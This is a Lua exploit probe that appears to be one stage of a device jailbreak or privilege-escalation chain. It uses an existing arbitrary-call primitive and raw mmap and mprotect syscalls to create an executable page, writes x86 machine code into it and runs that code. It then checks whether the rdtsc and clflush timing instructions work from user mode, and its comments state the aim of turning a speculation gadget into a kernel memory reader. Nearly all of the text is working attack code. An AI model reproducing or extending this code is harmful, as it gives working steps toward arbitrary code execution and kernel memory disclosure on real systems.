-- CRASH_CLASS: MEDIUM (executes its own bytes; a non-executable mapping takes the loader down)
-- PROBE 1245a: native code execution feasibility.
-- We already have an arbitrary-call primitive with all six argument registers
-- (native.fcall_with_rax). If a userland mapping can be made executable, that
-- combination is arbitrary ring-3 code execution - which turns the CPU itself
-- (a bounds-check-bypass speculation gadget) into a kernel memory reader.
-- Steps: (1) can mmap produce an executable page, (2) can bytes be written to
-- it, (3) does execution of those bytes return a controlled value,
-- (4) does rdtsc work at CPL3, (5) does clflush work at CPL3.
print("=== PROBE 1245a: native code execution feasibility ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function ES() local ok,s=pcall(function() return get_error_string() end) if ok then return tostring(s) end return "?" end
local function rq(a) local ok,v=pcall(function() return memory.read_qword(a) end) if ok then return N(v) end return -1 end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function hilo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,N(v) end
local function poke(addr, bytes)
  for i=1,#bytes do wb(addr+i-1, bytes[i]) end
end
local function peek(addr, n)
  local s = ""
  for i=0,n-1 do
    local ok,v = pcall(function() return N(memory.read_byte(addr+i)) end)
    if ok then s = s .. string.format("%02X", v) else s = s .. "??" end
  end
  return s
end

print(string.format("[0] pid=%d", N(mk(20)())))

local CODE = {
  ret1234 = {0xB8,0x34,0x12,0x00,0x00,0xC3},
  rdtsc   = {0x0F,0x31,0x48,0xC1,0xE2,0x20,0x48,0x09,0xD0,0xC3},
  clflush = {0x0F,0xAE,0x3F,0xB8,0x01,0x00,0x00,0x00,0xC3},
  testfib = {0xB8,0x34,0x12,0x00,0x00,0xC3},
}

local function try_exec(tag, addr)
  poke(addr, CODE.ret1234)
  print(string.format("    %s bytes now: %s", tag, peek(addr, 6)))
  local ok, v = pcall(function() return native.fcall_with_rax(addr, 0,0,0,0,0,0,0) end)
  if not ok then print(string.format("    %s CALL-FAIL %s", tag, tostring(v))) return false end
  local r = N(v)
  print(string.format("    %s call -> 0x%X (want 0x1234)", tag, r))
  return r == 0x1234
end

local function try_map(tag, prot, flags, len)
  local ok, v = pcall(function() return mk(477)(0, uint64(len), uint64(prot), uint64(flags), uint64(-1), uint64(0)) end)
  if not ok then print(string.format("  %-16s PCALL-FAIL %s", tag, tostring(v))) return nil end
  local h,l = hilo(v)
  local signed_hi = h
  print(string.format("  %-16s -> hi=0x%08X lo=0x%08X err=%s", tag, h, l, ES()))
  if h >= 0xFFFF8000 and l >= 0xFFFFF000 then return nil end
  local a = l + h * 4294967296
  if a <= 0 or a > 0x7FFFFFFFFFFF then return nil end
  return a
end

print("[A] executable mapping, prot=7 (rwx) then prot=5 (rx) then prot=0x33")
local a1 = try_map("mmap prot7", 7, 0x1002, 0x4000)
local a2 = try_map("mmap prot5", 5, 0x1002, 0x4000)
local a3 = try_map("mmap prot0x33", 0x33, 0x1002, 0x4000)

local exec_addr = nil
if a1 then
  print(string.format("[B] testing execution at 0x%X (prot7)", a1))
  if try_exec("prot7", a1) then exec_addr = a1 end
end
if not exec_addr and a2 then
  print(string.format("[B2] testing execution at 0x%X (prot5, write may have failed)", a2))
  if try_exec("prot5", a2) then exec_addr = a2 end
end
if not exec_addr and a3 then
  print(string.format("[B3] testing execution at 0x%X (prot0x33)", a3))
  if try_exec("prot0x33", a3) then exec_addr = a3 end
end
if not exec_addr then
  -- last resort: writable page, then mprotect to rx
  local aw = try_map("mmap prot3", 3, 0x1002, 0x4000)
  if aw then
    poke(aw, CODE.ret1234)
    print(string.format("[C] wrote code at 0x%X, mprotect -> %s", aw, tostring(select(2, pcall(function() return N(mk(74)(uint64(aw), uint64(0x4000), uint64(5))) end)))))
    if try_exec("mprotect", aw) then exec_addr = aw end
  end
end

if not exec_addr then
  print("=== NO EXECUTABLE MAPPING; rdtsc/clflush untested ===")
  print("=== DONE ===")
  return
end

print(string.format("[D] executable page at 0x%X", exec_addr))
print("[E] rdtsc at CPL3")
poke(exec_addr, CODE.rdtsc)
local ok1, t1 = pcall(function() return native.fcall_with_rax(exec_addr, 0,0,0,0,0,0,0) end)
local ok2, t2 = pcall(function() return native.fcall_with_rax(exec_addr, 0,0,0,0,0,0,0) end)
if ok1 and ok2 then
  local v1, v2 = N(t1), N(t2)
  print(string.format("     rdtsc -> 0x%X then 0x%X  delta=%d  (plausible=%s)",
        v1, v2, v2 - v1, tostring(v2 > v1 and (v2 - v1) < 100000000)))
else
  print(string.format("     rdtsc CALL-FAIL ok1=%s ok2=%s", tostring(ok1), tostring(ok2)))
end

print("[F] clflush at CPL3")
poke(exec_addr, CODE.clflush)
local ok3, c1 = pcall(function() return native.fcall_with_rax(exec_addr, 0, 0,0,0,0,0,0) end)
print(string.format("     clflush [rdi] -> ok=%s val=%s", tostring(ok3), tostring(ok3 and N(c1) or c1)))
print("=== DONE ===")
